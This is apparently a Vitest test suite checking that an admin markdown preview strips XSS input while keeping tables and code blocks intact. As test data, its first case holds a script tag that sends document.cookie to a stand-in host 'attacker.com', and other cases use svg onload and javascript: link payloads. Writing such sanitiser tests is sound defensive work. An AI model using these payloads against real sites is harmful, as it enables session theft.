import { describe, it, expect } from 'vitest';
import { renderMarkdown } from '@/pages/admin/_utils/renderMarkdown';

describe('Admin Markdown Security Prevention Suite (PB-18)', () => {
  it('strips <script> tags from admin preview', () => {
    const rawInput = 'Admin Preview <script>fetch("attacker.com/cookie?c=" + document.cookie)</script>';
    const output = renderMarkdown(rawInput);
    expect(output).not.toContain('<script');
    expect(output).not.toContain('attacker.com');
    expect(output).toContain('Admin Preview');
  });

  it('strips inline event handlers in admin preview', () => {
    const rawInput = '<svg onload="alert(1)"><circle r="10"/></svg>';
    const output = renderMarkdown(rawInput);
    expect(output).not.toContain('onload');
    expect(output).not.toContain('alert(1)');
  });

  it('strips javascript: URLs from hyperlinks in admin preview', () => {
    const rawInput = '[Malicious Link](javascript:alert(1))';
    const output = renderMarkdown(rawInput);
    expect(output).not.toContain('javascript:');
    expect(output).not.toContain('alert(1)');
  });

  it('preserves valid markdown tables and code blocks in admin preview', () => {
    const rawInput = `
# Admin CMS Preview

| Metric | Target |
| --- | --- |
| Accuracy | 99% |

\`\`\`sql
SELECT * FROM users WHERE is_active = true;
\`\`\`
    `.trim();

    const output = renderMarkdown(rawInput);
    expect(output).toContain('<h1');
    expect(output).toContain('Admin CMS Preview</h1>');
    expect(output).toContain('<table');
    expect(output).toContain('Accuracy');
    expect(output).toContain('<code>SELECT * FROM users WHERE is_active = true;</code>');
  });
});
